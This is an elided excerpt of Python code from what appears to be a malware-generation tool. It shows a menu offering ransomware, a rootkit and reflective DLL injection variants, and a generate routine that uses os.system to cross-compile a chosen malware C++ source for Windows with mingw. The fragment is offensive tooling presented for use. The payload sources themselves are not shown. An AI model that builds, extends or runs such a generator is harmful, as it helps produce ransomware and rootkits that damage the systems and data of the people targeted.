...
""" + colored("""[2]""" ,'cyan') + """ ransomeware
""" + colored("""[3]""" ,'cyan') + """ rootkit
...
""" + colored("""[12]""" ,'cyan') + """ Reflective DLL Injection
""" + colored("""[13]""" ,'cyan') + """ Shellcode Reflective DLL Injection
""")
    ...
    def do_generate(self, generate):
        ...
        if generate == 'powershell':
            ...
            if Cmd.payload_type == '':
                ...
                if Cmd.malware_type == '6':
                    os.system("x86_64-w64-mingw32-g++ ./malware/0"+ Cmd.malware_type  + "-malware/" + Cmd.malware_type + ".cpp -fpermissive")
